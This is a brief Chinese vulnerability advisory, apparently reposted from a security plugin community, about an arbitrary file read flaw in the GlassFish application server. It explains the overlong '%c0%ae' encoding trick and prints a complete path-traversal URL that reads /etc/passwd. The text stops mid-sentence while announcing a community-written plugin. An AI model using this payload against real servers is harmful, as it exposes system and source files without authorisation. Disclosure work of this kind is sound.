# 四叶草安全漏洞插件社区精华插件之漏洞预警：应用服务器glassfish任意文件读取漏洞

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MzI0MTE0MjYxOQ==&mid=401115083&idx=1&sn=387f5af3df5dc33f88e8634a8fe80edd&chksm=7b0c39ff4c7bb0e96f1ef187c52019ddea30e3119b467eababe0eab52c606a8f4515169f05ec&scene=126&sessionid=1681310981#rd](http://mp.weixin.qq.com/s?__biz=MzI0MTE0MjYxOQ==&mid=401115083&idx=1&sn=387f5af3df5dc33f88e8634a8fe80edd&chksm=7b0c39ff4c7bb0e96f1ef187c52019ddea30e3119b467eababe0eab52c606a8f4515169f05ec&scene=126&sessionid=1681310981#rd)

今日最新公布了一个名为‘应用服务器glassfish存在通用任意文件读取漏洞’的漏洞，大致漏洞原理如下：

java会将'%c0%ae'解析为'\\uC0AE'，最后转义为ASCCII字符的'.'（点）。这样通过以下payload读取特定文件：

“http://localhost:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd”

该漏洞同样可以列出对应目录文件基本上等同于源代码泄露，各种敏感信息暴露无遗。

针对该漏洞，四叶草安全漏洞插件社区，社区成员

Me\_fortune 已经编写了相应的插件，并且一上线：
